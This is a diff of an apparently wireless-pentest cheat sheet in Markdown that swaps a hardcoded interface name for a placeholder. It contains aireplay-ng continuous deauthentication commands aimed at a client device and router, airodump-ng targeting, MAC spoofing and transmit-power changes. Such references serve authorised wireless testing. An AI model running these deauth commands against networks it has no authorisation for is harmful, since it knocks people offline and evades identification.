@@ -156,22 +156,22 @@ sudo airodump-ng <wlan0> --band ag
 ```
 Option for 5 GHz only
 ```
-sudo airodump-ng wlan0mon --band a
+sudo airodump-ng <wlan0> --band a
 ```
 Option for 2.4 GHz only
 ```
-sudo airodump-ng wlan0mon --band g
+sudo airodump-ng <wlan0> --band g
 ```
 ```
-sudo airodump-ng wlan0mon --bssid <routerMAC> --channel <channel of router>
+sudo airodump-ng <wlan0> --bssid <routerMAC> --channel <channel of router>
 ```
 Option for 5 GHz:
 ```
-sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> wlan0mon -D
+sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> <wlan0> -D
 ```
 Option for 2.4 GHz:
 ```
-sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> wlan0mon
+sudo aireplay-ng --deauth 0 -c <deviceMAC> -a <routerMAC> <wlan0>
 ```
 
 -----
@@ -185,12 +185,7 @@ iw dev
 
 Take the wifi interface down
 ```
-sudo ip link set wlan0mon down
-```
-
-Rename the wifi interface to <wlan0>
-```
-sudo ip link set wlan0mon name <wlan0>
+sudo ip link set <wlan0> down
 ```
 
 Set managed mode
@@ -227,19 +222,14 @@ Change the MAC address
 sudo ip link set dev <wlan0> address <new mac address>
 ```
 
-Rename the wifi interface to wlan0mon
-```
-sudo ip link set <wlan0> name wlan0mon
-```
-
 Set monitor mode
 ```
-sudo iw wlan0mon set monitor control
+sudo iw <wlan0> set monitor control
 ```
 
 Bring the wifi interface up
 ```
-sudo ip link set dev wlan0mon up
+sudo ip link set dev <wlan0> up
 ```
 
 Verify the wifi interface name, MAC address and mode has changed
@@ -251,9 +241,9 @@ iw dev
 
 ### Change txpower
 ```
-sudo ip link set wlan0mon down
-sudo iw dev wlan0mon set txpower fixed 1600 (1600 = 16 dBm)
-sudo ip link set wlan0mon up
+sudo ip link set <wlan0> down
+sudo iw dev <wlan0> set txpower fixed 1600 (1600 = 16 dBm)
+sudo ip link set <wlan0> up
 ```
 
 -----
